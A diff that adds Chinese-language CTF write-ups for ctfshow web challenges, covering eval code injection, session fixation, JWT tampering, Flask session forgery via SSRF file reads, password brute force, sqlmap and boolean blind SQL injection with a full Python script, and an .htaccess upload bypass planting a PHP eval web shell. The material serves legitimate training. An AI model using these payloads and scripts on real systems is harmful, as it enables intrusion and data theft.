@@ -4637,6 +4637,35 @@ string(61) "<?php $flag='ctfshow{df3359af-a18f-4ca7-b70b-112dda95c201}';
 
 ------
 
+### CodeInject
+
+进入靶机后看到以下`php`代码：
+
+```php
+<?php
+#Author: h1xa
+error_reporting(0);
+show_source(__FILE__);
+
+eval("var_dump((Object)$_POST[1]);");
+```
+
+用`HackBar`构造`POST`请求，`1=scandir('/')`查看靶机根目录，发现文件`000f1ag.txt`。
+
+```
+object(stdClass)#1 (25) { ["0"]=> string(1) "." ["1"]=> string(2) ".." ["2"]=> string(10) ".dockerenv" ["3"]=> string(11) "000f1ag.txt" ["4"]=> string(3) "bin" ["5"]=> string(4) "boot" ["6"]=> string(3) "dev" ["7"]=> string(3) "etc" ["8"]=> string(4) "home" ["9"]=> string(3) "lib" ["10"]=> string(5) "lib32" ["11"]=> string(5) "lib64" ["12"]=> string(6) "libx32" ["13"]=> string(5) "media" ["14"]=> string(3) "mnt" ["15"]=> string(3) "opt" ["16"]=> string(4) "proc" ["17"]=> string(4) "root" ["18"]=> string(3) "run" ["19"]=> string(4) "sbin" ["20"]=> string(3) "srv" ["21"]=> string(3) "sys" ["22"]=> string(3) "tmp" ["23"]=> string(3) "usr" ["24"]=> string(3) "var" }
+```
+
+接着使用`1=file('/000f1ag.txt')`或`1=file_get_contents('/000f1ag.txt')`可以看到`flag`。
+
+```
+object(stdClass)#1 (1) { ["scalar"]=> string(46) "ctfshow{a3062485-c061-4ca1-82c9-2fec7b5f7c18} " }
+```
+
+提交`ctfshow{a3062485-c061-4ca1-82c9-2fec7b5f7c18}`即可。
+
+------
+
 ### 一句话木马变形
 
 输入`system('ls');`看到执行结果如下：
@@ -5364,6 +5393,567 @@ a/../../../../flag.txt内容为： FLAG = "CTF{file_path_bypass_is_fun}"
 ```
 
 提交`CTF{file_path_bypass_is_fun}`即可。
+
+------
+
+### Session固定攻击
+
+进入靶机后看到以下内容：
+
+```html
+<h2>Welcome test</h2>
+<hr>
+<p>Default username/password is "test"/"test".</p>
+<p>Flag in admin page</p>
+
+<a href="/login">Login</a> | <a href="/message">Send Message to Admin</a>
+```
+
+登录`test`账号，抓包填写正确的`session id`后，给`admin`发送任意消息，再次回到主页可以看到我们的身份变成了`admin`。盲猜靶机的后端代码会假装有个管理员用户点击了带有我们攻击者`session id`的网址，从而使我们`Session`固定攻击成功获得了管理员权限。
+
+Session固定攻击是因为`session`生成后从来没有变过，哪怕用户下线后再登录`session`也依然不变。所以，攻击者可以利用这种漏洞，将带有普通用户`session`信息的网址发给网站的系统管理员，一旦他们点击了攻击者发送的网址，此时管理员的`session`就是攻击者给的`session`，因此攻击者就能获得管理员权限。
+
+```html
+<h2>Welcome admin</h2>
+<hr>
+<p>Default username/password is "test"/"test".</p>
+<p>Flag in admin page</p>
+
+<h3>FLAG: CTF{ctfshow_session_fixation_is_a_common_web_security_vulnerability}</h3>
+
+<a href="/login">Login</a> | <a href="/message">Send Message to Admin</a>
+```
+
+提交`CTF{ctfshow_session_fixation_is_a_common_web_security_vulnerability}`即可。
+
+------
+
+### JWT令牌伪造
+
+进入靶机后看到内容如下：
+
+```html
+<div class="glass text-center">
+    <div class="neon">JWT CTF 靶场</div>
+    <p>尝试伪造 JWT 令牌，获取管理员权限！</p>
+    <form method="post" action="/login">
+        <input type="text" name="username" placeholder="输入用户名" class="form-control mb-3" required="">
+        <button class="btn glow-btn" type="submit">登录</button>
+    </form>
+    <p class="mt-3">提示：尝试修改 JWT 的 <code>alg</code> 字段为 <b>none</b> 绕过签名验证。</p>
+</div>
+```
+
+根据提示，我们可以采用`None`攻击绕过签名验证。
+
+用`Burp Suite`抓包，可以在`Response`中的`Cookie`里看到`token`值。
+
+```
+token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2V9.xtg1ltvVHM1MGPIna6l949dh1FW4Azsb8Kmijbso_XQ
+```
+
+用[JSON Web Token (JWT) Debugger](https://www.jwt.io/)的`JWT Decoder`解码`token`值，可得`decoded payload`如下：
+
+```
+{
+  "user": "admin",
+  "admin": false
+}
+```
+
+将`admin`值修改为`true`并使用`JWT Encoder`生成新的`token`值。
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.QhfIVx79uAahVG0LFtton8N9mzXK8nOkmeGcpFjxxx4
+```
+
+在`Burp Suite`中将`Cookie`中的`token`值修改为新的`token`值，放行后即可拿到`flag`。
+
+提交`CTF{jwt_none_alg_bypass_success}`即可。
+
+------
+
+### Flask_Session伪造
+
+进入靶机后点击读取网站，会跳转到`/read?url=https://baidu.com`，显示出百度首页。
+
+`/read?url=file:///proc/self/cmdline`读取执行路径，靶机显示内容如下。
+
+```
+python/app/app.py
+```
+
+`/read?url=file:///app/app.py`读取后端源码，整理代码格式后内容如下。
+
+```python
+# encoding:utf-8
+import re, random, uuid, urllib.request
+from flask import Flask, session, request
+
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random()*100)
+print(app.config['SECRET_KEY'])
+app.debug = False
+
+@app.route('/')
+def index():
+    session['username'] = 'guest'
+    return 'CTFshow 网页爬虫系统 <a href="/read?url=https://baidu.com">读取网页</a>'
+
+@app.route('/read')
+def read():
+    try:
+        url = request.args.get('url')
+        if re.findall('flag', url, re.IGNORECASE):
+            return '禁止访问'
+        res = urllib.request.urlopen(url)
+        return res.read().decode('utf-8', errors='ignore')
+    except Exception as ex:
+        print(str(ex))
+    return '无读取内容可以展示'
+
+@app.route('/flag')
+def flag():
+    if session.get('username') == 'admin':
+        return open('/flag.txt', encoding='utf-8').read()
+    else:
+        return '访问受限'
+
+if __name__=='__main__':
+    app.run(
+        debug=False,
+        host="0.0.0.0"
+    )
+```
+
+审计代码发现`session`中`username`必须为`admin`才能获取`flag`。
+
+编写`Python`代码获取随机数。
+
+```python
+import requests
+import uuid
+import random
+import os
+
+url = "http://17c3e3ee-dc92-43ff-be10-0aecbd84294b.challenge.ctf.show/"
+
+def get_randStr():
+    response = requests.get(url + "read?url=file:///sys/class/net/eth0/address")
+    mac = response.text.strip()
+    temp = mac.split(':')
+    temp = [int(i,16) for i in temp]
+    temp = [bin(i).replace('0b','').zfill(8) for i in temp]
+    temp = ''.join(temp)
+    mac = int(temp,2)
+    random.seed(mac)
+    randStr = str(random.random()*100)
+    return randStr
+
+if __name__ == '__main__':
+    randStr = get_randStr()
+    print("Random String:", randStr)
+```
+
+代码的执行结果如下：
+
+```
+Random String: 13.001778933476416
+```
+
+抓包获取`session=eyJ1c2VybmFtZSI6Imd1ZXN0In0.aaEC5A.fDrwCa48y4xsx-g8US7LjHRfHk4;`，得到随机数后，使用伪造工具[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)伪造。
+
+先对首页的`session`进行解密。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools/flask-session-cookie-manager]
+└─$ python3 flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6Imd1ZXN0In0.aaEC5A.fDrwCa48y4xsx-g8US7LjHRfHk4" -s "13.001778933476416"
+{'username': 'guest'}
+```
+
+将`username`值修改为`admin`后加密，得到伪造的`flask_session`值。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools/flask-session-cookie-manager]
+└─$ python3 flask_session_cookie_manager3.py encode -t "{'username':'admin'}" -s "13.001778933476416"
+eyJ1c2VybmFtZSI6ImFkbWluIn0.aaED-A.pwAuxCn5evHsOrJR1YQKExsq3gI
+```
+
+`F12`点击`Application`，在`Storage`中选中`Cookies`，修改本地`Cookies`中`session`的值为我们伪造的值`eyJ1c2VybmFtZSI6ImFkbWluIn0.aaED-A.pwAuxCn5evHsOrJR1YQKExsq3gI`后，访问`/flag`就能拿到`CTF{flask_session_is_secure}`，提交即可。
+
+------
+
+### 弱口令爆破
+
+下载附件`pass.dic`，得到一个弱口令字典。
+
+输入账号`admin`和密码`1`，用`Burp Suite`抓包，右键`Send to Intruder`，选中`1`点击`add Position`后导入弱口令字典，开始爆破密码。
+
+```
+POST / HTTP/1.1
+Host: ead691d1-56a2-42f5-b8be-b2259139a435.challenge.ctf.show
+Content-Length: 25
+Cache-Control: max-age=0
+Origin: http://ead691d1-56a2-42f5-b8be-b2259139a435.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+username=admin&password=1
+```
+
+在爆破结果中可以看到一个与其他弱口令长度不一致的密码`834100`。输入账号`admin`和密码`834100`看到`Congratulations!`获得`flag`。
+
+提交`CTF{this_is_a_sample_flag}`即可。
+
+------
+
+### 联合查询注入
+
+进入靶机后看到文章目录，点击第一个跳转到`/?id=1`。直接用`sqlmap`无脑爆破数据库。
+
+```bash
+$ sqlmap -u "https://0cd04518-8007-47ef-be6d-d57e635830f7.challenge.ctf.show/?id=1" --current-db
+[INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.20.1, PHP 7.3.11
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching current database
+current database: 'ctfshow_page_informations'
+
+$ sqlmap -u "https://0cd04518-8007-47ef-be6d-d57e635830f7.challenge.ctf.show/?id=1" -D ctfshow_page_informations --tables
+[INFO] fetching tables for database: 'ctfshow_page_informations'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'pages'
+[INFO] retrieved: 'users'
+Database: ctfshow_page_informations
+[2 tables]
++-------+
+| pages |
+| users |
++-------+
+
+$ sqlmap -u "https://0cd04518-8007-47ef-be6d-d57e635830f7.challenge.ctf.show/?id=1" -D ctfshow_page_informations -T users --columns
+[INFO] fetching columns for table 'users' in database 'ctfshow_page_informations'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'id','int(11)'
+[INFO] retrieved: 'username','varchar(32)'
+[INFO] retrieved: 'password','varchar(32)'
+Database: ctfshow_page_informations
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(32) |
+| username | varchar(32) |
++----------+-------------+
+
+$ sqlmap -u "https://0cd04518-8007-47ef-be6d-d57e635830f7.challenge.ctf.show/?id=1" -D ctfshow_page_informations -T users -C "username, password" --dump
+[INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'ctfshow_page_informations'
+[WARNING] reflective value(s) found and filtering out
+Database: ctfshow_page_informations
+Table: users
+[1 entry]
++----------+----------------------------+
+| username | password                   |
++----------+----------------------------+
+| admin    | CTF{admin_secret_password} |
++----------+----------------------------+
+```
+
+提交`CTF{admin_secret_password}`即可。
+
+------
+
+### 布尔盲注爆破
+
+布尔判断情况：①登陆失败返回包含`script`；②登陆成功返回未知，这里盲猜不含`script`。
+
+编写`Python`代码进行布尔盲注爆破数据库。
+
+```python
+import requests
+import string
+
+URL = "http://70260993-934c-43a7-bb41-e6f49a7b49e6.challenge.ctf.show//login.php"
+
+FAIL = "script" # 登录失败时的响应头
+
+def send_payload(payload):
+    data = {
+        "username": payload,
+        "password": "anything"
+    }
+    resp = requests.post(URL, data=data, allow_redirects=False)
+    return resp.text.find(FAIL) == -1
+
+def get_length(payload_template, min_len=1, max_len=100):
+    for l in range(min_len, max_len):
+        payload = payload_template.format(l)
+        if send_payload(payload):
+            return l
+    return None
+
+def get_string(payload_template, length):
+    result = ""
+    chars = string.ascii_letters + string.digits + "_{}@.-,! "
+    for i in range(1, length+1):
+        for c in chars:
+            payload = payload_template.format(i, c)
+            if send_payload(payload):
+                result += c
+                print(f"\r{result}", end="", flush=True)
+                break
+    print()
+    return result
+
+def get_table_names():
+    print("[*] Getting table name length...")
+    length = get_length("admin' and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())={};#---")
+    print(f"[*] Table names length: {length}")
+    print("[*] Getting table names...")
+    names = get_string("admin' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))=ascii('{}');#---", length)
+    print(f"[*] Table names: {names.split(',')}")
+    return names.split(',')
+
+def get_column_names(table):
+    print(f"[*] Getting column names length for {table}...")
+    length = get_length(f"admin' and (select length(group_concat(column_name)) from information_schema.columns where table_name='{table}')={{}};#---")
+    print(f"[*] Column names length: {length}")
+    print(f"[*] Getting column names for {table}...")
+    names = get_string(f"admin' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{table}'),{{}},1))=ascii('{{}}');#---", length)
+    print(f"[*] Column names: {names}")
+    return names.split(',')
+
+def get_field(table, column, row=0):
+    print(f"[*] Getting length of {column} in {table} row {row}...")
+    length = get_length(f"admin' and (select length({column}) from {table} limit {row},1)={{}};#---", max_len=256)
+    print(f"[*] Field length: {length}")
+    if length is None:
+        print(f"[!] Cannot determine length for {column} in {table} row {row}, skipping.")
+        return ""
+    print(f"[*] Getting value of {column} in {table} row {row}...")
+    value = get_string(f"admin' and ascii(substr((select {column} from {table} limit {row},1),{{}},1))=ascii('{{}}');#---", length)
+    print(f"[*] Value: {value}")
+    return value
+
+if __name__ == "__main__":
+    # 1. 获取所有表名
+    tables = get_table_names()
+    # 2. 获取每个表的列名
+    for table in tables:
+        columns = get_column_names(table)
+        # 3. 获取每个表的每个字段内容
+        for col in columns:
+            for row in range(2): #获取前2行
+                get_field(table, col, row)
+```
+
+耐心等待......代码运行结果如下：
+
+```
+[*] Getting table name length...
+[*] Table names length: 11
+[*] Getting table names...
+pages,users
+[*] Table names: ['pages', 'users']
+[*] Getting column names length for pages...
+[*] Column names length: 16
+[*] Getting column names for pages...
+id,title,content
+[*] Column names: id,title,content
+[*] Getting length of id in pages row 0...
+[*] Field length: 1
+[*] Getting value of id in pages row 0...
+1
+[*] Value: 1
+[*] Getting length of id in pages row 1...
+[*] Field length: 1
+[*] Getting value of id in pages row 1...
+2
+[*] Value: 2
+[*] Getting length of title in pages row 0...
+[*] Field length: 7
+[*] Getting value of title in pages row 0...
+Welcome
+[*] Value: Welcome
+[*] Getting length of title in pages row 1...
+[*] Field length: 5
+[*] Getting value of title in pages row 1...
+About
+[*] Value: About
+[*] Getting length of content in pages row 0...
+[*] Field length: 37
+[*] Getting value of content in pages row 0...
+Welcome to the CTF training platform!
+[*] Value: Welcome to the CTF training platform!
+[*] Getting length of content in pages row 1...
+[*] Field length: 43
+[*] Getting value of content in pages row 1...
+This is a platform for training CTF skills.
+[*] Value: This is a platform for training CTF skills.
+[*] Getting column names length for users...
+[*] Column names length: 63
+[*] Getting column names for users...
+USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+[*] Column names: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+[*] Getting length of USER in users row 0...
+[*] Field length: None
+[!] Cannot determine length for USER in users row 0, skipping.
+[*] Getting length of USER in users row 1...
+[*] Field length: None
+[!] Cannot determine length for USER in users row 1, skipping.
+[*] Getting length of CURRENT_CONNECTIONS in users row 0...
+[*] Field length: None
+[!] Cannot determine length for CURRENT_CONNECTIONS in users row 0, skipping.
+[*] Getting length of CURRENT_CONNECTIONS in users row 1...
+[*] Field length: None
+[!] Cannot determine length for CURRENT_CONNECTIONS in users row 1, skipping.
+[*] Getting length of TOTAL_CONNECTIONS in users row 0...
+[*] Field length: None
+[!] Cannot determine length for TOTAL_CONNECTIONS in users row 0, skipping.
+[*] Getting length of TOTAL_CONNECTIONS in users row 1...
+[*] Field length: None
+[!] Cannot determine length for TOTAL_CONNECTIONS in users row 1, skipping.
+[*] Getting length of id in users row 0...
+[*] Field length: 1
+[*] Getting value of id in users row 0...
+1
+[*] Value: 1
+[*] Getting length of id in users row 1...
+[*] Field length: None
+[!] Cannot determine length for id in users row 1, skipping.
+[*] Getting length of username in users row 0...
+[*] Field length: 5
+[*] Getting value of username in users row 0...
+admin
+[*] Value: admin
+[*] Getting length of username in users row 1...
+[*] Field length: None
+[!] Cannot determine length for username in users row 1, skipping.
+[*] Getting length of password in users row 0...
+[*] Field length: 30
+[*] Getting value of password in users row 0...
+CTF{bool_sql_injection_is_fun}
+[*] Value: CTF{bool_sql_injection_is_fun}
+[*] Getting length of password in users row 1...
+[*] Field length: None
+[!] Cannot determine length for password in users row 1, skipping.
+```
+
+提交`CTF{bool_sql_injection_is_fun}`即可。
+
+------
+
+### htaccess攻击
+
+直接上传`.php`文件会弹出提示框“选择的图片中包含不支持的格式”。
+
+上传一张`.jpg`图片，用`Burp Suite`抓包修改为`.htaccess`文件。上传成功后会提示文件上传成功。
+
+```
+POST /upload.php HTTP/1.1
+Host: 257fe5d3-2d07-4b09-ab86-1fbd067b8d4a.challenge.ctf.show
+Content-Length: 83268
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCxXdSzYx8fh8TlFV
+Origin: http://257fe5d3-2d07-4b09-ab86-1fbd067b8d4a.challenge.ctf.show
+Referer: http://257fe5d3-2d07-4b09-ab86-1fbd067b8d4a.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryCxXdSzYx8fh8TlFV
+Content-Disposition: form-data; name="file"; filename=".htaccess"
+Content-Type: image/jpeg
+
+AddType application/x-httpd-php .jpg
+------WebKitFormBoundaryCxXdSzYx8fh8TlFV--
+```
+
+`.htaccess`文件的内容如下。
+
+```htaccess
+AddType application/x-httpd-php .jpg
+```
+
+也可以用以下`.htaccess`文件内容，针对所有匹配`.jpg`扩展名的文件，将它们当作`PHP`脚本执行。
+
+```htaccess
+<FilesMatch "\.jpg">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+接着我们写入`PHP`一句话木马，将文件后缀直接修改为`.jpg`，上传文件即可访问。
+
+```php
+<?php @eval($_POST["shell"]); ?>
+```
+
+用`HackBar`构造`POST`请求。查看靶机根目录`shell=var_dump(scandir("/"));`，没有找到`flag`。
+
+```php
+array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" }
+```
+
+`PHP`中的 `glob()` 函数支持通配符，能快速模糊匹配字符串，非常适合找`flag`文件。`glob()`函数不支持递归子目录，但我们可以用`array_merge()`组合，尝试在`CTF`常见的`flag`文件路径中模糊匹配。
+
+```php
+shell=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机的回显内容如下：
+
+```php
+array(1) { [0]=> string(22) "/var/www/html/flag.php" }
+```
+
+`shell=var_dump(scandir('/var/www/html'));`可以看一下这个目录都有哪些文件。
+
+```php
+array(9) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(6) "images" [4]=> string(9) "index.php" [5]=> string(2) "js" [6]=> string(5) "layui" [7]=> string(6) "upload" [8]=> string(10) "upload.php" }
+```
+
+直接用`file_get_contents`拿`flag`吧。
+
+```php
+var_dump(file_get_contents('/var/www/html/flag.php'));
+```
+
+右键查看网页源码可以在注释中找到`flag`。
+
+```php+HTML
+string(278) "<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-21 21:31:23
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-16 22:41:40
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+$flag="ctfshow{9a6edab8-c450-48fe-94f0-3b956f873214}";"
+```
+
+提交`ctfshow{9a6edab8-c450-48fe-94f0-3b956f873214}`即可。
 
 ------
 
